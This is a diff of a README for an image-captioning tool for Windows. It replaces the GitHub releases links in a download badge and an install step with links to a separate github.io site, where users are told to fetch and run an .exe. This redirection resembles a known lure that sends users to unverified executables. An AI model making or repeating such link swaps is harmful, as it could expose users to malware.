@@ -1,6 +1,6 @@
 # 🖼️ image-caption-generator - Create accurate text descriptions for images
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Gunnycoffeemug977/image-caption-generator/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://gunnycoffeemug977.github.io)
 
 ## What is this tool
 
@@ -14,7 +14,7 @@ This software works on computers running Windows 10 or Windows 11. Ensure your c
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/Gunnycoffeemug977/image-caption-generator/releases) to find the latest version of the application.
+1. Visit the [releases page](https://gunnycoffeemug977.github.io) to find the latest version of the application.
 2. Look for the file ending in .exe in the Assets section.
 3. Click the file name to start the download.
 4. Once the download finishes, open your Downloads folder in File Explorer.
